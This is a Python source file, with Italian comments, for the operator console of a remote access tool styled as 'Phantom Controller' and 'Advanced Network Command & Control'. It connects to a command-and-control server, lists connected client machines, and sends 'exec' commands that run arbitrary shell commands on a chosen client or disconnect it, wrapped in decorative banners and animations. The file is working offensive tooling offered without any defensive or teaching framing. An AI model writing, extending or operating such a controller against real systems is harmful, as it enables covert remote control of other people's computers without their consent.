import socket
import threading
import sys
import select
import json
import time
import os
import random
from datetime import datetime
from colorama import Fore, Back, Style, init

# Inizializza colorama per i colori su Windows
init(autoreset=True)

class Colors:
    """Classe per i colori e gli stili del terminale"""
    BLACK = Fore.BLACK
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    GREEN = Fore.GREEN
    MAGENTA = Fore.MAGENTA
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    
    BG_BLACK = Back.BLACK
    BG_BLUE = Back.BLUE
    BG_CYAN = Back.CYAN
    BG_GREEN = Back.GREEN
    BG_RED = Back.RED
    
    RESET = Style.RESET_ALL
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM

class VisualEffects:
    """Classe per gestire gli effetti visivi"""
    
    @staticmethod
    def clear_screen():
        """Pulisce lo schermo"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def type_writer(text, speed=0.02, color=Colors.WHITE, end="\n"):
        """Effetto macchina da scrivere"""
        for char in text:
            sys.stdout.write(color + char)
            sys.stdout.flush()
            time.sleep(speed)
        sys.stdout.write(end)
    
    @staticmethod
    def loading_bar(text, duration=2, width=30):
        """Mostra una barra di caricamento"""
        for i in range(width + 1):
            percent = i * 100 // width
            bar = '█' * i + '░' * (width - i)
            sys.stdout.write(f'\r{Colors.CYAN}{text} {Colors.GREEN}[{bar}] {percent}%')
            sys.stdout.flush()
            time.sleep(duration/width)
        print()
    
    @staticmethod
    def spinner(text, duration=2):
        """Mostra un indicatore di caricamento rotante"""
        spinner = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.YELLOW}{text} {Colors.GREEN}{spinner[i % len(spinner)]}')
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
        sys.stdout.write(f'\r{Colors.GREEN}{text} ✓{" " * 20}\n')
        sys.stdout.flush()

    @staticmethod
    def pulse_text(text, iterations=3, delay=0.1):
        """Effetto pulsante per il testo"""
        colors = [Colors.RED, Colors.YELLOW, Colors.WHITE, Colors.YELLOW]
        for _ in range(iterations):
            for color in colors:
                sys.stdout.write(f'\r{color}{text}')
                sys.stdout.flush()
                time.sleep(delay)
        print()
    
    @staticmethod
    def display_banner():
        """Mostra un banner ASCII casuale"""
        banners = [
            f"""{Colors.CYAN}{Colors.BRIGHT}
    ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗     
    ██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║     
    ██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║     
    ██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║     
    ╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗
     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
     {Colors.RED}╔═══════════════════════════════════════════════════════╗
     ║  {Colors.WHITE}Phantom Controller v2.5 | Created by {Colors.MAGENTA}@alchemy000  {Colors.RED}║
     ╚═══════════════════════════════════════════════════════╝{Colors.RESET}
            """,
            f"""{Colors.GREEN}{Colors.BRIGHT}
     _____            _             _ _           
    /  __ \          | |           | | |          
    | /  \/ ___  _ __| |_ _ __ ___ | | | ___ _ __ 
    | |    / _ \| '__| __| '__/ _ \| | |/ _ \ '__|
    | \__/\ (_) | |  | |_| | | (_) | | |  __/ |   
     \____/\___/|_|   \__|_|  \___/|_|_|\___|_|   
     {Colors.BLUE}╔═══════════════════════════════════════════════════════╗
     ║  {Colors.WHITE}Advanced Network Command & Control {Colors.YELLOW}|{Colors.RED} ELITE EDITION {Colors.BLUE}║
     ╚═══════════════════════════════════════════════════════╝{Colors.RESET}
            """,
            f"""{Colors.MAGENTA}{Colors.BRIGHT}
    ┏━━━┓━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━┏┓
    ┃┏━┓┃━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━━┃┃
    ┃┃━┗┛┏━━┓┏━┓━┏━━┓┏━━┓┏━━┓┃┃━┏━━┓┏━┓━┏━━┓┏━━┓┏━━┓┏┛┃
    ┃┃━┏┓┃┏┓┃┃┏┓┓┃┏━┛┗━┓┃┃┏┓┃┃┃━┃┏┓┃┃┏┓┓┃┏━┛┗━┓┃┃┏┓┃┃┏┛
    ┃┗━┛┃┃┗┛┃┃┃┃┃┃┗━┓┃┗┛┗┛┃┃┃┃┗┓┃┗┛┃┃┃┃┃┃┗━┓┃┗┛┗┛┃┃┃┃┃
    ┗━━━┛┗━━┛┗┛┗┛┗━━┛┗━━━┓┃┃┃┗━┛┗━━┛┗┛┗┛┗━━┛┗━━━┓┃┃┃┗┛
    ━━━━━━━━━━━━━━━━━━━━┏━┛┃┃━━━━━━━━━━━━━━━━━━┏━┛┃┃━━
    ━━━━━━━━━━━━━━━━━━━━┗━━┛┛━━━━━━━━━━━━━━━━━━┗━━┛┛━━
    {Colors.RED}╔═══════════════════════════════════════════════════════╗
    ║  {Colors.WHITE}Remote Access Tool {Colors.YELLOW}|{Colors.CYAN} Secure Command Interface  {Colors.RED}║
    ╚═══════════════════════════════════════════════════════╝{Colors.RESET}
            """
        ]
        print(random.choice(banners))

class ClientController:
    def __init__(self, server_ip, control_port=4343):
        self.server_ip = server_ip
        self.control_port = control_port
        self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True
        self.current_output = ""
        self.command_lock = threading.Lock()
        self.visual = VisualEffects()
        self.start_time = datetime.now()
        
        # Tema di colori per i messaggi del sistema
        self.system_color = Colors.CYAN
        self.error_color = Colors.RED
        self.success_color = Colors.GREEN
        self.info_color = Colors.YELLOW
        self.prompt_color = Colors.MAGENTA + Colors.BRIGHT

    def connect_to_server(self):
        try:
            # Mostra effetti di avvio
            self.visual.clear_screen()
            self.visual.display_banner()
            
            # Mostra info di sistema
            self._display_system_info()
            
            # Animazione di connessione
            self.visual.spinner(f"Connessione al server {self.server_ip}:{self.control_port}", 2)
            
            # Connessione effettiva
            self.control_socket.connect((self.server_ip, self.control_port))
            
            # Messaggio di successo
            self.visual.type_writer(
                f"[+] Connesso al server di controllo su {self.server_ip}:{self.control_port}",
                speed=0.01, 
                color=self.success_color
            )
            
            # Thread per ricevere i messaggi dal server
            threading.Thread(target=self.receive_messages, daemon=True).start()
            
            # Animazione caricamento per refresh iniziale
            self.visual.spinner("Caricamento lista client...", 1)
            
            # Mostra la lista iniziale dei client
            self.send_command("refresh")
            
            # Avvia l'interfaccia utente
            self._show_command_help()
            self.command_interface()
            
        except ConnectionRefusedError:
            self.visual.type_writer(
                f"[!] Impossibile connettersi al server {self.server_ip}:{self.control_port}",
                speed=0.01,
                color=self.error_color
            )
        except Exception as e:
            self.visual.type_writer(
                f"[!] Errore: {str(e)}",
                speed=0.01,
                color=self.error_color
            )
        finally:
            self.control_socket.close()

    def _display_system_info(self):
        """Mostra informazioni di sistema in un box formattato"""
        now = datetime.now()
        uptime = str(now - self.start_time).split('.')[0]
        
        border_top = f"{Colors.BLUE}╔{'═' * 50}╗"
        border_bottom = f"{Colors.BLUE}╚{'═' * 50}╝"
        
        print(border_top)
        print(f"{Colors.BLUE}║{Colors.CYAN} SYSTEM INFO{' ' * 39}{Colors.BLUE}║")
        print(f"{Colors.BLUE}╠{'═' * 50}╣")
        print(f"{Colors.BLUE}║{Colors.WHITE} Time      : {now.strftime('%H:%M:%S')}{' ' * 33}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.WHITE} Date      : {now.strftime('%d/%m/%Y')}{' ' * 33}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.WHITE} Server IP : {self.server_ip}{' ' * (40 - len(self.server_ip))}{Colors.BLUE}║")
        print(f"{Colors.BLUE}║{Colors.WHITE} Port      : {self.control_port}{' ' * (40 - len(str(self.control_port)))}{Colors.BLUE}║")
        print(border_bottom)
        print()

    def receive_messages(self):
        while self.running:
            try:
                ready, _, _ = select.select([self.control_socket], [], [], 0.1)
                if ready:
                    data = self.control_socket.recv(4096).decode('utf-8')
                    if not data:
                        break
                    
                    # Gestione messaggi JSON per output strutturati
                    if data.startswith("{") and data.endswith("}"):
                        try:
                            message = json.loads(data)
                            if message.get("type") == "command_result":
                                self.display_command_result(message)
                                continue
                        except json.JSONDecodeError:
                            pass
                    
                    self.current_output = data
                    self.display_output()
            except Exception as e:
                with self.command_lock:
                    print(f"\n{self.error_color}[!] Errore nella ricezione: {str(e)}{Colors.RESET}")
                break

    def display_output(self):
        """Mostra output normale con formattazione migliorata"""
        with self.command_lock:
            box_width = 60
            border_top = f"{Colors.CYAN}╔{'═' * box_width}╗"
            border_bottom = f"{Colors.CYAN}╚{'═' * box_width}╝"
            
            print("\n" + border_top)
            
            # Dividi l'output in righe e formatta ciascuna all'interno del box
            for line in self.current_output.split('\n'):
                # Gestisce righe lunghe dividendole
                while len(line) > box_width - 2:
                    print(f"{Colors.CYAN}║{Colors.WHITE} {line[:box_width-2]}{Colors.CYAN} ║")
                    line = line[box_width-2:]
                
                # Riempimento con spazi per allineare il bordo destro
                padding = ' ' * (box_width - 2 - len(line))
                print(f"{Colors.CYAN}║{Colors.WHITE} {line}{padding}{Colors.CYAN} ║")
            
            print(border_bottom + "\n")
            
            # Prompt animato
            self._animated_prompt()

    def display_command_result(self, message):
        """Mostra output formattato per risultati comandi"""
        with self.command_lock:
            box_width = 60
            client_id = message.get('client', 'sconosciuto')
            
            # Header con informazioni sul client
            header = f" Risultato comando sul client {client_id} "
            padding = '═' * ((box_width - len(header)) // 2)
            
            border_top = f"{Colors.GREEN}╔{padding}{header}{padding}{'═' * (box_width - len(padding)*2 - len(header))}╗"
            border_middle = f"{Colors.GREEN}╠{'═' * box_width}╣"
            border_bottom = f"{Colors.GREEN}╚{'═' * box_width}╝"
            
            print("\n" + border_top)
            
            # Timestamp
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"{Colors.GREEN}║{Colors.YELLOW} Timestamp: {timestamp}{' ' * (box_width - 13 - len(timestamp))}{Colors.GREEN}║")
            
            print(border_middle)
            
            # Output del comando
            output = message.get("output", "Nessun output")
            for line in output.split('\n'):
                # Gestisce righe lunghe dividendole
                while len(line) > box_width - 2:
                    print(f"{Colors.GREEN}║{Colors.WHITE} {line[:box_width-2]}{Colors.GREEN} ║")
                    line = line[box_width-2:]
                
                # Riempimento con spazi per allineare il bordo destro
                padding = ' ' * (box_width - 2 - len(line))
                print(f"{Colors.GREEN}║{Colors.WHITE} {line}{padding}{Colors.GREEN} ║")
            
            print(border_bottom + "\n")
            
            # Prompt animato
            self._animated_prompt()

    def _animated_prompt(self):
        """Visualizza un prompt animato"""
        prompt_chars = [">", "»", "►", "»", ">"]
        for char in prompt_chars:
            sys.stdout.write(f"\r{self.prompt_color}{char} {Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.05)
        
        # Lascia il carattere finale come prompt
        sys.stdout.write(f"\r{self.prompt_color}► {Colors.RESET}")
        sys.stdout.flush()

    def send_command(self, command):
        try:
            self.control_socket.send(command.encode('utf-8'))
        except Exception as e:
            with self.command_lock:
                print(f"{self.error_color}[!] Errore nell'invio del comando: {str(e)}{Colors.RESET}")

    def command_interface(self):
        while self.running:
            try:
                command = input("")
                
                if not command:
                    continue
                    
                if command.lower() == 'exit':
                    self.visual.type_writer(
                        "[!] Chiusura connessione in corso...",
                        speed=0.01,
                        color=self.info_color
                    )
                    self.visual.loading_bar("Disconnessione", 1.5)
                    self.running = False
                    break
                elif command.lower() == 'refresh':
                    self.visual.spinner("Aggiornamento lista client", 1)
                    self.send_command("refresh")
                elif command.lower().startswith('kick '):
                    self.handle_kick_command(command)
                elif command.lower().startswith('exec '):
                    self.handle_exec_command(command)
                elif command.lower() == 'help':
                    self._show_command_help()
                elif command.lower() == 'clear':
                    self.visual.clear_screen()
                    self.visual.display_banner()
                    self._animated_prompt()
                else:
                    self.visual.type_writer(
                        "Comando non riconosciuto. Digita 'help' per la lista comandi",
                        speed=0.01,
                        color=self.error_color
                    )
                    self._animated_prompt()
                
            except KeyboardInterrupt:
                self.visual.type_writer(
                    "\n[!] Interruzione rilevata. Uscita in corso...",
                    speed=0.01,
                    color=self.info_color
                )
                self.visual.loading_bar("Disconnessione", 1)
                self.running = False
                break
            except Exception as e:
                self.visual.type_writer(
                    f"[!] Errore: {str(e)}",
                    speed=0.01,
                    color=self.error_color
                )
                self._animated_prompt()

    def handle_kick_command(self, command):
        parts = command.split(' ', 1)
        if len(parts) == 2 and parts[1].strip():
            client_name = parts[1].strip()
            self.visual.spinner(f"Disconnessione del client {client_name}", 1)
            self.send_command(f"kick {client_name}")
        else:
            self.visual.type_writer(
                "Formato comando errato. Usa: kick <nome>",
                speed=0.01,
                color=self.error_color
            )
            self._animated_prompt()

    def handle_exec_command(self, command):
        parts = command.split(' ', 2)
        if len(parts) == 3 and parts[1].strip() and parts[2].strip():
            client_num = parts[1].strip()
            cmd = parts[2].strip()
            
            # Verifica che client_num sia un numero
            if not client_num.isdigit():
                self.visual.type_writer(
                    "Il numero client deve essere un valore numerico",
                    speed=0.01,
                    color=self.error_color
                )
                self._animated_prompt()
                return
            
            self.visual.spinner(f"Esecuzione comando sul client {client_num}", 1.5)
            self.send_command(f"exec {client_num} {cmd}")
        else:
            self.visual.type_writer(
                "Formato comando errato. Usa: exec <num> <comando>",
                speed=0.01,
                color=self.error_color
            )
            self._animated_prompt()

    def _show_command_help(self):
        """Visualizza guida comandi con formattazione migliorata"""
        border_color = Colors.BLUE
        title_color = Colors.CYAN + Colors.BRIGHT
        cmd_color = Colors.YELLOW
        desc_color = Colors.WHITE
        
        box_width = 70
        
        border_top = f"{border_color}╔{'═' * box_width}╗"
        border_bottom = f"{border_color}╚{'═' * box_width}╝"
        border_middle = f"{border_color}╠{'═' * box_width}╣"
        
        print("\n" + border_top)
        print(f"{border_color}║{title_color} COMANDI DISPONIBILI{' ' * (box_width - 19)}{border_color}║")
        print(border_middle)
        
        # Lista comandi formattata
        commands = [
            ("refresh", "Aggiorna lista client connessi"),
            ("exec <num> <cmd>", "Esegui comando sul client specificato"),
            ("kick <nome>", "Disconnette il client specificato"),
            ("clear", "Pulisce lo schermo"),
            ("help", "Mostra questo messaggio di aiuto"),
            ("exit", "Esci dal controller")
        ]
        
        for cmd, desc in commands:
            cmd_text = f"{cmd_color}{cmd}"
            padding = ' ' * (25 - len(cmd))
            desc_text = f"{desc_color}{desc}"
            remaining_space = ' ' * (box_width - 27 - len(desc))
            print(f"{border_color}║ {cmd_text}{padding}→ {desc_text}{remaining_space}{border_color}║")
        
        print(border_bottom + "\n")
        self._animated_prompt()

if __name__ == "__main__":
    # Visualizzazione iniziale
    VisualEffects.clear_screen()
    
    if len(sys.argv) != 2:
        VisualEffects.type_writer(
            "[!] Utilizzo: python controller.py <server_ip>",
            speed=0.02,
            color=Colors.RED
        )
        sys.exit(1)
    
    # Effetto Matrix all'avvio
    print(f"{Colors.GREEN}")
    for _ in range(20):
        line = ""
        for _ in range(os.get_terminal_size().columns // 2):
            char = random.choice("01")
            line += char + " "
        print(line)
        time.sleep(0.05)
    
    server_ip = sys.argv[1]
    controller = ClientController(server_ip)
    controller.connect_to_server()
